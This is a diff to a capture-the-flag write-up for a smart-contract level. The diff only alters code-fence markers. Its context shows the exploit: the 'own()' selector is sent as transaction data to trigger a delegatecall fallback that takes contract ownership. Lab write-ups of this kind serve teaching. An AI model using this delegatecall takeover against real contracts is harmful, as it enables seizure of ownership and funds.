@@ -13,7 +13,7 @@ If we type in contract.abi, you can see that there is a fallback function, which
 
 We want to pass in the own() function into the delegatecall: 
 
-```  
+```-
 function own() public {
     owner = msg.sender;
   }
@@ -23,7 +23,7 @@ the delegatecall() allows us to pass in a function from the called contract and 
 
 **Solution:**
 
-```
+```-
 var ownFunction = web3.utils.sha3("own()")
 
 contract.sendTransaction({data: ownFunction})
